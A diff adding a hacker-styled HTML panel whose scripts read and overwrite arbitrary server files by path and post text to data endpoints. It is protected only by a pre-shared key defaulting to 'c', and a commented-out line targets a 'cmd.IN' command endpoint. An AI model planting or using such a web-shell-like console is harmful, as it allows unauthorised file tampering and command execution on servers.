@@ -1,0 +1,66 @@
+<script>
+    function fetchstuff(){
+  fetch("/../data.OUT?path="+document.getElementById('path').value+'&psk='+document.getElementById('pskIN').value).then(response => response.text()).then((response)=>{document.getElementById('dataIN').value=response;}).catch(err => alert(err));
+    }
+  
+  function exec(){
+    // document.getElementById('exec').src='/../data.IN?data='+encodeURIComponent(document.getElementById('dataIN').value)+'&psk='+document.getElementById('pskIN').value+'&path='+document.getElementById('path').value
+  fetch('/../data.IN?data='+'&psk='+document.getElementById('pskIN').value+'&path='+document.getElementById('path').value, {
+    method: 'POST',
+    headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+    },
+    body:document.getElementById('dataIN').value
+    
+})
+.then(response => response.text())
+.then(response => console.log(response))
+  
+  
+  }
+</script>
+<style>
+  html {
+  	background-color: #000000;
+  	color: #FFFFFF;
+  	font-family: monospace;
+  }
+  
+  input {
+  	background-color: #000000;
+  	color: #00FF00;
+  	font-family: monospace;
+  }
+  textarea {
+  	background-color: #000000;
+  	color: #00FF00;
+  	font-family: monospace;
+  }
+  button {
+  	background-color: #000000;
+  	color: #00FF00;
+  	font-family: monospace;
+  }
+  
+  .lowBAR {
+  	position: absolute;
+  	bottom: 0;
+  	right: 0;
+  }
+  .highBAR {
+  	position: absolute;
+  	top: 0;
+  	right: 0;
+  }
+</style>
+<div style="width:100%"class="highBAR">
+  <input style="width:99.99%;color:#ffffff"type="text"value="package.json"id="path"><br>
+  <input style="width:99.99%;color:#111111"type="text"value="c"id="pskIN"><br>
+  <textarea style="width:100%"type="text"value="/*command goes here*/"id="dataIN"></textarea><br>
+</div>
+<div style="width:100%"class="lowBAR">
+  <button onclick="exec()"style="width:50%">send</button>
+  <button onclick="fetchstuff()"style="width:50%">fetch</button></div>
+<iframe src="" style="border:0px #ffffff none;" id="exec" scrolling="no"marginheight="0px" marginwidth="0px" height="0px" width="0px"></iframe>
+<!-- document.getElementById('exec').src='/../cmd.IN?cmd='+document.getElementById('cmdIN').innerHTML+'&psk='+document.getElementById('psk').value -->
